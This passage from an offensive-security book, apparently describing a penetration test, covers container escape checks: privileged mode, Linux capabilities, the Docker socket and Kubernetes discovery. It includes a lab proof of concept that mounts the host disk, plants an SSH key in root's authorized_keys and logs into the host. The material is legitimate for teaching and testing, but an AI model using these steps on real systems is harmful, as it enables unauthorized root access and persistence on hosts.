9:cpuset:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc
<var>--snip--</var>

shell&gt; <b>cat /proc/1/mounts</b>
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/6CWK4O7ZJREMTOZGIKSF5XG6HS</code></pre>
<p class="CodeListingCaption"><a id="listing6-6">Listing 6-6</a>: Listing attributes of the process bearing PID 1 in the <em>/proc</em> folder</p>
<p>We could keep going, but it is pretty clear from the mentions of Docker in the cgroup names and mount points that we are trapped inside a container. Plus, in a typical modern Linux system, the command starting the first process should be akin to <em>/sbin/init </em>or <em>/usr/lib/systemd</em>, not <em>/bin/sh</em>.</p>
<p>Being root inside a container still gives us the power to install packages and access root-protected files, mind you, but we can only exert that power over resources belonging to our narrow and very limited namespace.</p>
<p>One of the very first reflexes to have when landing in a container is to check whether it is running in privileged mode.</p>
<h2 id="h1-501263c06-0005">Checking for Privileged Mode</h2>
<p class="BodyFirst">In <em>privileged execution mode</em>, Docker merely acts as a packaging environment: it maintains the namespace isolation but grants wide access to all device files, like the hard drive, as well as all the Linux capabilities (more on that in the next section).</p>
<p>The container can therefore alter any resource on the host system, such as the kernel features, hard drive, network, and so on. If we find we’re in privileged mode, we can just mount the main partition, slip an SSH key in any home folder, and open a new admin shell on the host. Here’s a quick proof of concept of just that in the lab for illustration purposes:</p>
<pre><code># Demo lab
root@DemoContainer:/# <b>ls /dev</b>
autofs           kmsg                ppp       tty10
bsg              lightnvm            psaux     tty11
<var>--snip--</var>
# tty devices are usually filtered out by cgroups, so we must be inside a privileged container

root@DemoContainer:/# <b>fdisk -l</b>
Disk /dev/dm-0: 23.3 GiB, 25044189184 bytes, 48914432 sectors
Units: sectors of 1 * 512 = 512 bytes
<var>--snip--</var>

# mount the host's main partition
root@DemoContainer:/# <b>mount /dev/dm-0 /mnt &amp;&amp; ls /mnt</b>
bin   dev  home lib  lost+found  mnt  proc...

# inject our SSH key into the root home folder
root@DemoContainer:/# echo "ssh-rsa AAAAB3NzaC1yc2EA..." &gt; /mnt/root/.ssh/authorized_keys

<span epub:type="pagebreak" title="103" id="Page_103"/># get the host's IP and SSH into it
root@DemoContainer:/# <b>ssh root@172.17.0.1</b>

root@host:/#</code></pre>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	An unprivileged user even inside a privileged container could not easily break out using this technique since the <code>mount</code> command would not work. They would need to first elevate their privileges or attack other containers on the same host that are exposing ports, for instance.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>You would think that nobody would dare run a container in privileged mode, especially in a production environment, but life is full of surprises, and some folks may require it. Take a developer who needs to adjust something as simple as the TCP timeout value (a kernel option). To do this, the developer would naturally browse the Docker documentation and come across the <code>sysctl</code> Docker flag, which essentially runs the <code>sysctl</code> command from within the container. However, when run, this command will, of course, fail to change the kernel TCP timeout option unless it’s invoked in privileged mode. The fact that putting the container in privileged mode is a security risk would not even cross this developer’s mind—<code>sysctl</code><em> </em>is an official and supported flag described in the Docker documentation, for heaven’s sake!</p>
<h2 id="h1-501263c06-0006">Linux Capabilities</h2>
<p class="BodyFirst">Now we can return to our survey app to check whether we can easily break namespace isolation. We list the<em> /dev</em> folder’s contents, but the result lacks all the classic pseudo-device files like <em>tty*,</em> <em>sda</em>, and <em>mem</em> that imply privileged mode. Some admins trade the privileged mode for a list of individual permissions or capabilities. Think of <em>capabilities</em> as a fine-grained breakdown of the permissions classically attributed to the all-powerful root user on Linux. A user with the capability <code>CAP_NET_ADMIN</code> would be allowed to perform root operations on the network stack, such as changing the IP address, binding to lower ports, and entering promiscuous mode to sniff traffic. The user would, however, be prevented from mounting filesystems, for instance. That action requires the <code>CAP_SYS_ADMIN</code> capability.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="note">
<h2><span class="NoteHead">NOTE</span></h2>
<p>	One can argue that the capability <code>CAP_SYS_ADMIN</code> is the new root, given the number of privileges it grants.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<p>When instructed to do so by the container’s owner with the <code>--add-cap</code> flag, Docker can attach additional capabilities to a container. Some of these powerful capabilities can be leveraged to break namespace isolation and reach other containers or even compromise the host by sniffing packets routed to other containers, loading kernel modules that execute code on the host, or mounting other containers’ filesystems.</p>
<p><span epub:type="pagebreak" title="104" id="Page_104"/>We list the current capabilities of the surveysapp container by inspecting the <em>/proc</em> filesystem and then decode them into meaningful permissions using the <code>capsh</code> tool:</p>
<pre><code>shell&gt; <b>cat /proc/self/status |grep Cap</b>
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

root@Bouncer:/# <b>capsh --decode=00000000a80425fb</b>
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid
,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...</code></pre>
<p>The effective and permitted capabilities of our current user are <code>CapPrm</code> and <code>CapEff</code>, which amount to the normal set of permissions we can expect from root inside a container: kill processes (<code>CAP_KILL</code>), change file owners (<code>CAP_CHOWN</code>), and so on. All these operations are tightly confined to the current namespace, so we are still pretty much stuck.</p>
<aside epub:type="sidebar">
<div class="top hr"><hr/></div>
<section class="box">
<h2><span class="ColorText" style="color:#000000">Complexities of Capabilities</span></h2>
<p class="BoxBodyFirst">Capabilities can quickly become ugly, especially in the way they are handled during runtime. When a child thread is spawned, the kernel assigns it multiple lists of capabilities, the most important two being the set of effective (<code>CapEff</code>) and permitted (<code>CapPrm</code>) capabilities. <code>CapEff</code> reflects the native permissions that can be exerted right away, while a capability in <code>CapPrm</code> can only be used after a <code>capset</code> system call that specifically acquires that privilege (<code>capset</code> sets the corresponding bit in <code>CapEff</code>).</p>
<p><code>CapPrm</code> is the sum of three inputs:</p>
<ul>
<li>Common capabilities found in both the inheritable capabilities (<code>CapInh</code>) of the parent process <em>and</em> the inheritable capabilities of the corresponding file on disk. This operation is performed through a bitwise AND, so a file with no capabilities, for example, nullifies this input.</li>
<li>Permitted capabilities (<code>CapPrm</code>) of the executable file, as long as they fall within the maximum set of capabilities allowed by the parent process (<code>CapBnd</code>).</li>
<li>The parent process’s ambient capabilities (<code>CapAmb</code>). The parent cherry-picks appropriate capabilities from its <code>CapPrm</code> and <code>CapInh</code> and adds them to the <code>CapAmb</code> list to be transferred to the child process. <code>CapAmb</code> is only there as a trick to allow “regular” scripts without any file capabilities to inherit some of the caller’s capabilities. In other words, even if the first input of this list is nullified, the parent can still infuse its children with its inheritable or permitted capabilities. If the executable file has capabilities, this third input is ignored.</li>
</ul>
<p><span epub:type="pagebreak" title="105" id="Page_105"/>The child’s <code>CapEff</code> list is equal to its <code>CapPrm</code> if the file has the effective bit set; otherwise, it gets populated by <code>CapAmb</code>. Inheritable capabilities (<code>CapInh</code>) and bounded capabilities (<code>CapBnd</code>) are transferred as is to the child process.</p>
<p>Before you start loading your shotgun, know that I only wrote this to demonstrate how tricky it is to determine the set of capabilities assigned to a new process. I encourage you to dive deeper into the subject and learn how to leverage capabilities in containers. You can start with Adrian Mouat’s excellent introduction “Linux Capabilities: Why They Exist and How They Work” at <a href="https://blog.container-solutions.com/" class="LinkURL">https://blog.container-solutions.com/</a> and the official Linux kernel manual page on capabilities in Section 7 of <a href="https://man7.org/" class="LinkURL">https://man7.org/</a>.</p>
<div class="bottom hr"><hr/></div>
</section>
</aside>
<h2 id="h1-501263c06-0007">Docker Socket</h2>
<p class="BodyFirst">Next we look for the <em>/var/run/docker.sock </em>file, which is the REST API used to communicate with the Docker daemon on the host. If we can reach this socket from within the container, using a simple <code>curl</code> for instance, we can instruct it to launch a privileged container and then gain root access to the host system. We begin by checking for <em>docker.sock</em>:</p>
<pre><code>shell&gt; <b>curl --unix-socket /var/run/docker.sock http://localhost/images/json</b>
curl: (7) Couldn't connect to server

shell&gt; <b>ls /var/run/docker.sock</b>
ls: cannot access '/var/run/docker.sock': No such file or directory
shell&gt; <b>mount | grep docker</b>

# docker.sock not found</code></pre>
<p>No luck there. We then check the kernel’s version, hoping for one that has some documented exploits to land on the host, but we strike out once more. The machine is running a 4.14.146 kernel, which at the time I ran this was only a couple of versions behind the latest version:</p>
<pre><code>shell&gt; <b>uname -a</b>
Linux f1a7a6f60915 4.14.146-119.123.amzn2.x86_64 #1</code></pre>
<p>All in all, we are running as a relatively powerless root user inside an up-to-date machine without any obvious misconfigurations or exploits. We can always set up a similar kernel in a lab and then drill down into memory structures and <code>syscalls</code> until we find a zero-day to break namespace isolation, but let’s leave that as a last resort kind of thing.</p>
<p>The first impulse of any sane person trapped in a cage is to try to break free. It’s a noble sentiment. But if we can achieve our most devious goals while locked behind bars, why spend time sawing through them in the first place?</p>
<p>It sure would be great to land on the host and potentially inspect other containers, but given the current environment, I believe it’s time we pull back from the barred window, drop the useless blunt shank, and focus instead on the bigger picture.</p>
<p><span epub:type="pagebreak" title="106" id="Page_106"/>Forget about breaking free from this single insignificant host. How about crushing the entire floor—nay, the entire building—with a single stroke? Now that would be a tale worth telling.</p>
<p>Remember how we dumped environment variables in “Arbitrary Code Execution” on page 92? We confirmed the template injection vulnerability and focused on Django-related variables because that was the main task at hand, but if you paid close attention, you may have caught a glimpse of something tremendously more important. Something much more grandiose.</p>
<p>Let me show you the output once more:</p>
<pre><code>shell&gt; <b>env</b>

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/root
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
<var>--snip--</var></code></pre>
<p>We are running inside a container managed by a Kubernetes cluster! Never mind this lonely, overstaffed worker machine; we have a chance of bringing down the whole kingdom!</p>
<h2 id="h1-501263c06-0008">Resources</h2>
<ul>
<li>Burp is famous for its Active Scanner, which automates much of the parameter reconnaissance phase. Alternatively, you can try some extensions that fuzz for various vulnerabilities. Snoopy Security maintains an interesting compilation of such extensions at <a href="https://github.com/snoopysecurity/awesome-burp-extensions/" class="LinkURL">https://github.com/snoopysecurity/awesome-burp-extensions/</a><em>.</em></li>
<li>Check out James Kettle’s talk “Server-Side Template Injection: RCE for the Modern Webapp” to learn about various exploitation techniques: <a href="https://www.youtube.com/watch?v=3cT0uE7Y87s" class="LinkURL">https://www.youtube.com/watch?v=3cT0uE7Y87s</a>.</li>
<li>The Docker reference is available at <em/><a href="https://dockr.ly/2sgaVhj" class="LinkURL">https://dockr.ly/2sgaVhj</a>.</li>
<li>A great article about container breakout is “The Route to Root: Container Escape Using Kernel Exploitation,” where Nimrod Stoler uses CVE-2017-7308 to escape isolation: <a href="http://bit.ly/2TfZHV1" class="LinkURL">http://bit.ly/2TfZHV1</a>.</li>
<li>Find descriptions of other exploits at <a href="https://unit42.paloaltonetworks.com/" class="LinkURL">https://unit42.paloaltonetworks.com/</a>.</li>
</ul>
</section>
</body></html>